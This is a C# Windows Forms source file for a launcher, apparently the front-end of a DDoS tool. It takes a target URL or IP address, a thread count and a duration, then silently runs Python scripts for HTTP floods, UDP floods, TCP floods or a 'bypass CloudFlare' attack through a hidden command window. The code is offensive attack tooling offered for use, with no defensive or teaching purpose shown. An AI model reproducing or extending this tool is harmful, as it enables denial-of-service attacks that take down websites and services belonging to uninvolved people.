using System.Diagnostics;
namespace dos
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            ToolTip toolTip1 = new ToolTip();
            ToolTip toolTip2 = new ToolTip();


            toolTip1.SetToolTip(label3, "If you choose L7, enter a URL. If you choose L4, enter an IP address.");
            toolTip2.SetToolTip(label5, "Only if you selected L4");
        }

        private void label3_Click(object sender, EventArgs e)
        {

        }
        private void button1_Click(object sender, EventArgs e)
        {
            
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.RedirectStandardInput = true;
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true; 

            Process process = new Process();
            process.StartInfo = psi;
            process.Start();
            process.StandardInput.WriteLine("cd dos && pip install -r requirements.txt");

            int Threads = int.Parse(textBox1.Text);
            int Seconds = int.Parse(textBox3.Text);
            string A = comboBox1.Text;
            string B = "l7-bypass CloudFlare";
            string b = "l7-Http";
            string C = "l4-udp";
            string c = "l4-tcp";

            if (A == B)
            {
                process.StandardInput.WriteLine($"python l7.py cfb {textBox2.Text} {Threads} {Seconds}");
            }
            if (A == b)
            {
                process.StandardInput.WriteLine($"python l7.py http {textBox2.Text} {Threads} {Seconds}");
            }
            if (A == C)
            {
                process.StandardInput.WriteLine($"python l4.py udp {textBox2.Text} {textBox4.Text} {Threads} {Seconds}");
            }
            if (A == c)
            {
                process.StandardInput.WriteLine($"python l4.py tcp {textBox2.Text} {textBox4.Text} {Threads} {Seconds}");
            }
        }
    }
}
